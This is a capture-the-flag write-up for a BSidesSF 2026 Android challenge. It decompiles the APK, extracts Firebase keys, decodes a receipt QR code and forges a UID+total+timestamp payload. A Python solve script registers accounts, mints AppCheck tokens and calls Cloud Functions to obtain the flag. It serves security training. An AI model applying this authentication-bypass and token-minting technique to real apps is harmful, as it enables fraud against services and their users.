# Vinyl Drop

| Campo       | Valor              |
|-------------|--------------------
| Plataforma  | BSidesSF 2026      |
| Categoría   | Mobile RE          |
| Dificultad  | Medium             |
| Puntos      | 1000               |
| Autor       | itsc0rg1           |

## Descripción
> Can you figure out how to gain access to exclusive deals?

## TL;DR
Android app scans QR codes and validates them via a Firebase Cloud Function. A receipt image embedded in the APK contains a QR code with the payload format `UID+total+timestamp`. Forging a payload with our own Firebase UID and a recent timestamp returns the flag.

## Análisis inicial

```bash
file vinyl-drop.apk
# Android package (APK), with gradle app-metadata.properties

unzip -l vinyl-drop.apk | head -10
# 4 DEX files, native libs (barhopper_v3 for barcode scanning), MLKit barcode models

apktool d vinyl-drop.apk -o apktool_out -f
jadx vinyl-drop.apk -d jadx_out --no-res
```

Package: `com.bsidessf.vinyldrop` — Kotlin/Compose app with Firebase backend.

### App structure (from AndroidManifest.xml)

| Activity            | Role                                              |
|---------------------|---------------------------------------------------|
| `MainActivity`      | Firebase Auth login (email + password)             |
| `RegisterActivity`  | Firebase Auth registration                         |
| `WelcomeActivity`   | "Scan QR Code" button → launches barcode scanner   |
| `BarcodeScanActivity` | Camera-based QR scanner (MLKit + ZXing fallback) |
| `RewardActivity`    | Displays reward text (the flag)                    |

### Firebase configuration (from `res/values/strings.xml`)

```
google_api_key:       AIzaSyA9O-Hy1ySj7qL8Ntc6D5RoXjRxO_xHG1Q
google_app_id:        1:59012385614:android:b679cde719174f35acec1f
project_id:           ctf-2026-fish
google_storage_bucket: ctf-2026-fish.firebasestorage.app
```

### Key strings

```
reward_congrats:      "Congrats! The flag is,"
welcome_instructions: "Scan your QR code to gain access to exclusive records."
```

## Vulnerabilidad identificada

The app's flow is:
1. User logs in with Firebase Auth
2. Scans a QR code
3. QR content is sent to Firebase Cloud Function `validateScanPayload`
4. Function validates the payload and returns the flag if valid

The vulnerability is that the QR payload format is deterministic and forgeable — all three components (UID, total, timestamp) are either known or controllable by the attacker.

### Tipo de vulnerabilidad
CWE-290: Authentication Bypass by Spoofing — the server-side validation trusts client-provided data that can be trivially forged.

## Proceso de resolución

### Paso 1: Identify the app flow

Decompiled `WelcomeActivity.java` reveals the core logic:

```java
// WelcomeActivity.java — sendScanToFunction()
getFunctions().getHttpsCallable("validateScanPayload")
    .call(hashMapOf("value" to barcodeValue));
```

The scanned barcode value is sent directly to a Firebase Cloud Function named `validateScanPayload`. The response contains either `{success: true, reward: "..."}` or `{error: true, reason: "..."}`.

### Paso 2: Find the QR code in the APK

The APK resources contain three app-specific images in `res/drawable/`:
- `drop.png` — logo text "DROP"
- `reward_img.png` — a red flag icon
- `vinyl_drop_receipt.png` — **a receipt with a QR code at the bottom**

The receipt image shows:

```
Vinyl Drop
123 Main Street
Date: 02/01/2026

Hamilton 10 Shot LP    $24.99
Wicked: Collector's Case $104.99
Subtotal:              $129.98
Tax:                   $6.50
Total:                 $136.48

Save this receipt to gain exclusive access to deals!
[QR CODE]
```

### Paso 3: Decode the QR code

```python
from PIL import Image
from pyzbar.pyzbar import decode
img = Image.open('apktool_out/res/drawable/vinyl_drop_receipt.png')
results = decode(img)
print(results[0].data.decode())
# fLVtQ7NpWLSYlW4uGk6yvHMcgFP2+136.48+1769949927
```

The QR encodes three `+`-separated fields:
1. `fLVtQ7NpWLSYlW4uGk6yvHMcgFP2` — a Firebase UID (28 chars, base64-like)
2. `136.48` — the receipt total
3. `1769949927` — a Unix timestamp (`2026-02-01 21:25:27 UTC`, matching the receipt date)

### Paso 4: Understand the AppCheck flow

The app uses a custom `CustomAppCheckProvider` that calls a Cloud Function `mintAppCheckToken`:

```java
// CustomAppCheckProvider.java — buildMintUrl()
String projectId = this.app.getOptions().getProjectId();  // "ctf-2026-fish"
// URL: https://us-central1-ctf-2026-fish.cloudfunctions.net/mintAppCheckToken
```

The mintToken flow:
1. Get the user's Firebase ID token
2. POST to `mintAppCheckToken` with `{appId: "..."}` and `Authorization: Bearer <idToken>`
3. Receive `{token: "...", ttlMillis: 3600000}`

### Paso 5: Forge the payload and call the function

```bash
python3 solve.py
```

First attempt with the original QR value (using our UID):
```
{"result":{"success":false,"error":true,"reason":"First part: Should be a UID for the current user."}}
```

After replacing the UID:
```
{"result":{"success":false,"error":true,"reason":"Third part: Purchase must be within the last 30 days."}}
```

After replacing the timestamp with `int(time.time())`:
```
{"result":{"success":true,"reward":"CTF{Dr0pTh3Beat5andBar5}"}}
```

The server validates:
1. **Part 1** (UID): must match the authenticated user's UID
2. **Part 2** (total): must be a valid dollar amount (136.48 from the receipt)
3. **Part 3** (timestamp): must be within the last 30 days

## Exploit final

```python
#!/usr/bin/env python3
"""
Challenge: vinyl-drop
Category:  Mobile RE
Platform:  BSidesSF 2026
"""
import requests, time

API_KEY = "AIzaSyA9O-Hy1ySj7qL8Ntc6D5RoXjRxO_xHG1Q"
PROJECT_ID = "ctf-2026-fish"
APP_ID = "1:59012385614:android:b679cde719174f35acec1f"

# Step 1: Register a Firebase account
email = f"ctfplayer{int(time.time())}@test.com"
password = "CTFpassword123!"
r = requests.post(
    f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={API_KEY}",
    json={"email": email, "password": password, "returnSecureToken": True}
)
data = r.json()
id_token = data["idToken"]
uid = data["localId"]
print(f"[+] Registered {email}, UID: {uid}")

# Step 2: Mint AppCheck token (required by validateScanPayload)
r2 = requests.post(
    f"https://us-central1-{PROJECT_ID}.cloudfunctions.net/mintAppCheckToken",
    json={"appId": APP_ID},
    headers={"Content-Type": "application/json; charset=utf-8", "Authorization": f"Bearer {id_token}"}
)
app_check_token = r2.json()["token"]
print(f"[+] Got AppCheck token")

# Step 3: Forge QR payload: UID + receipt_total + current_timestamp
barcode_value = f"{uid}+136.48+{int(time.time())}"
print(f"[*] Forged payload: {barcode_value}")

# Step 4: Call validateScanPayload
r3 = requests.post(
    f"https://us-central1-{PROJECT_ID}.cloudfunctions.net/validateScanPayload",
    json={"data": {"value": barcode_value}},
    headers={
        "Content-Type": "application/json",
        "Authorization": f"Bearer {id_token}",
        "X-Firebase-AppCheck": app_check_token
    }
)
result = r3.json()
print(f"[*] Response: {result}")

if result.get("result", {}).get("success"):
    print(f"\n[+] FLAG: {result['result']['reward']}")
```

## Ejecución
```bash
python3 solve.py
# [+] Registered ctfplayer1774133220@test.com, UID: 0ulP7pUiCVcHAhbd8GhqCg9gJby2
# [+] Got AppCheck token
# [*] Forged payload: 0ulP7pUiCVcHAhbd8GhqCg9gJby2+136.48+1774133220
# [*] Response: {'result': {'success': True, 'reward': 'CTF{Dr0pTh3Beat5andBar5}'}}
# [+] FLAG: CTF{Dr0pTh3Beat5andBar5}
```

## Approaches descartados
None — the solve path was direct once the receipt QR code was found and the validation error messages guided payload construction.

## Flag
```
CTF{Dr0pTh3Beat5andBar5}
```

## Key Lessons
- **Check all embedded resources**: The receipt image with the QR code was the key — hidden in `res/drawable/vinyl_drop_receipt.png`. Without it, there's no way to know the expected payload format.
- **Firebase Cloud Functions are callable**: With the API key and project ID from the APK, you can register accounts and call Cloud Functions directly via HTTP — no Android device needed.
- **Error messages as oracle**: The server helpfully returned detailed validation errors ("Should be a UID", "Purchase must be within the last 30 days") that revealed exactly what each field needed to be.
- **Custom AppCheck is bypassable**: The app uses a custom AppCheck provider backed by its own Cloud Function, not Google's Play Integrity or SafetyNet. Since the `mintAppCheckToken` function just needs a valid Firebase ID token, any registered user can mint AppCheck tokens.
- **QR payload is forgeable**: All three components (UID, total, timestamp) are either deterministic or attacker-controlled, making the entire validation scheme trivially bypassable.

## Referencias
- Firebase Auth REST API: `identitytoolkit.googleapis.com/v1/accounts:signUp`
- Firebase Cloud Functions callable protocol: POST with `{data: {...}}`
- Firebase App Check custom provider: `AppCheckProviderFactory` → `AppCheckProvider.getToken()`
- pyzbar for QR code decoding from static images
